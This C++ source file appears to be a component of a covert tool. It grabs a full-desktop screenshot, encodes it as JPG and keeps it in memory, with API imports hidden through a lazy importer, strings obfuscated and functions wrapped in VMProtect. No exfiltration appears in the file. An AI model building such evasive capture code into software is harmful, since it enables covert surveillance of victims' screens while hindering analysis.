#include <stdlib.h>
#include <windows.h>
#include <iostream>
#include <GdiPlus.h>
#include <wingdi.h>
#include <fstream>
#include "Xorstr.h"
#include "Screenshot.h"
#include "VMProtectSDK.h"
#include "LazyImporter.h"

ByteArray screenshot;
BITMAPINFOHEADER CreateBitmapHeader(int width, int height)
{

	BITMAPINFOHEADER  bi;

	// create a bitmap
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = width;
	bi.biHeight = -height;  //this is the line that makes it draw upside down or not
	bi.biPlanes = 1;
	bi.biBitCount = 32;
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;

	return bi;

}

HBITMAP GdiPlusScreenCapture(HWND hWnd)
{

	// get handles to a device context (DC)
	HDC hwindowDC = LI_FN(GetDC).in(LI_MODULE("User32.dll").cached())(hWnd);
	HDC hwindowCompatibleDC = LI_FN(CreateCompatibleDC).in(LI_MODULE("Gdi32.dll").cached())(hwindowDC);
	LI_FN(SetStretchBltMode).in(LI_MODULE("Gdi32.dll").cached())(hwindowCompatibleDC, COLORONCOLOR);

	// define scale, height and width
	int scale = 1;
	int screenx = LI_FN(GetSystemMetrics).in(LI_MODULE("User32.dll").cached())(SM_XVIRTUALSCREEN);
	int screeny =  LI_FN(GetSystemMetrics).in(LI_MODULE("User32.dll").cached())(SM_YVIRTUALSCREEN);
	int width = LI_FN(GetSystemMetrics).in(LI_MODULE("User32.dll").cached())(SM_CXVIRTUALSCREEN);
	int height =  LI_FN(GetSystemMetrics).in(LI_MODULE("User32.dll").cached())(SM_CYVIRTUALSCREEN);

	// create a bitmap
	HBITMAP hbwindow =  LI_FN(CreateCompatibleBitmap).in(LI_MODULE("Gdi32.dll").cached())(hwindowDC, width, height);
	//BITMAPINFOHEADER bi =  LI_FN(CreateBitmapHeader).in(LI_MODULE("Gdi32.dll").cached())(width, height);
	BITMAPINFOHEADER bi = CreateBitmapHeader(width, height);

	// use the previously created device context with the bitmap
	LI_FN(SelectObject).in(LI_MODULE("Gdi32.dll").cached())(hwindowCompatibleDC, hbwindow);

	// Starting with 32-bit Windows, GlobalAlloc and LocalAlloc are implemented as wrapper functions that call HeapAlloc using a handle to the process's default heap.
	// Therefore, GlobalAlloc and LocalAlloc have greater overhead than HeapAlloc.
	DWORD dwBmpSize = ((width * bi.biBitCount + 31) / 32) * 4 * height;
	HANDLE hDIB = LI_FN(GlobalAlloc).in(LI_MODULE("Kernel32.dll").cached())(GHND, dwBmpSize);
	char* lpbitmap = (char*)LI_FN(GlobalLock).in(LI_MODULE("Kernel32.dll").cached())(hDIB);

	// copy from the window device context to the bitmap device context
	LI_FN(StretchBlt).in(LI_MODULE("Gdi32.dll").cached())(hwindowCompatibleDC, 0, 0, width, height, hwindowDC, screenx, screeny, width, height, SRCCOPY);   //change SRCCOPY to NOTSRCCOPY for wacky colors !
	LI_FN(GetDIBits).in(LI_MODULE("Gdi32.dll").cached())(hwindowCompatibleDC, hbwindow, 0, height, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

	// avoid memory leak
	LI_FN(DeleteDC).in(LI_MODULE("Gdi32.dll").cached())(hwindowCompatibleDC);
	LI_FN(ReleaseDC).in(LI_MODULE("User32.dll").cached())(hWnd, hwindowDC);

	return hbwindow;

}

bool SaveToMemory(HBITMAP* hbitmap, std::vector<BYTE>& data, std::string dataFormat = LIT("png"))
{
	VMProtectBeginUltra(LIT("SaveToMemory"));
	Gdiplus::Bitmap bmp(*hbitmap, nullptr);
	// write to IStream
	IStream* istream = nullptr;
	CreateStreamOnHGlobal(NULL, TRUE, &istream);

	// define encoding
	CLSID clsid;
	if (dataFormat.compare(LIT("bmp")) == 0) { CLSIDFromString(LIT(L"{557cf400-1a04-11d3-9a73-0000f81ef32e}"), &clsid); }
	else if (dataFormat.compare(LIT("jpg")) == 0) { CLSIDFromString(LIT(L"{557cf401-1a04-11d3-9a73-0000f81ef32e}"), &clsid); }
	else if (dataFormat.compare(LIT("gif")) == 0) { CLSIDFromString(LIT(L"{557cf402-1a04-11d3-9a73-0000f81ef32e}"), &clsid); }
	else if (dataFormat.compare(LIT("tif")) == 0) { CLSIDFromString(LIT(L"{557cf405-1a04-11d3-9a73-0000f81ef32e}"), &clsid); }
	else if (dataFormat.compare(LIT("png")) == 0) { CLSIDFromString(LIT(L"{557cf406-1a04-11d3-9a73-0000f81ef32e}"), &clsid); }

	Gdiplus::Status status = bmp.Save(istream, &clsid, NULL);
	if (status != Gdiplus::Status::Ok)
		return false;

	// get memory handle associated with istream
	HGLOBAL hg = NULL;
	GetHGlobalFromStream(istream, &hg);

	// copy IStream to buffer
	int bufsize = GlobalSize(hg);
	data.resize(bufsize);

	// lock & unlock memory
	LPVOID pimage = LI_FN(GlobalLock).in(LI_MODULE("Kernel32.dll").cached())(hg);
	memcpy(&data[0], pimage, bufsize);
	LI_FN(GlobalUnlock).in(LI_MODULE("Kernel32.dll").cached())(hg);
	istream->Release();
	return true;
	VMProtectEnd();
}
void Screenshot()
{
	VMProtectBeginUltra(LIT("Screenshot"));
	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
	
	// get the bitmap handle to the bitmap screenshot
	HWND hWnd = LI_FN(GetDesktopWindow).in(LI_MODULE("User32.dll").cached())();
	HBITMAP hBmp = GdiPlusScreenCapture(hWnd);

	// save as png to memory
	std::vector<BYTE> data1;
	std::string dataFormat = LIT("jpg");

	if (SaveToMemory(&hBmp, data1, dataFormat))
	{
		screenshot = data1;

	}

	Gdiplus::GdiplusShutdown(gdiplusToken);
	VMProtectEnd();
}